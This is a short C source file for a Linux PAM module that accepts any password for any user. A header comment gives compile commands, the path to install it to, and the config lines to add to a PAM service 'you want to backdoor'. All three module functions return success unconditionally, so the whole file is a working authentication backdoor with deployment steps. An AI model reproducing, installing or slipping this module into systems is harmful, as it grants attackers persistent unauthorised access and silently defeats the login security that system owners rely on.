/* 
   this PAM module lets anyone in with any password.
   this should never be used in production for obvious reasons.
   compile with: 
   gcc -fPIC -c pam_any.c 
   ld -x --shared -o pam_any.so pam_any.o

   copy resulting pam_any.so to /lib/security/ or /lib64/security/

   add following to top of /pam.d/ authy you want to backdoor:
   auth            sufficient      pam_any.so
   account         sufficient      pam_any.so
*/

#include <security/pam_appl.h>
#include <security/pam_ext.h>
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_setcred
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate
(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}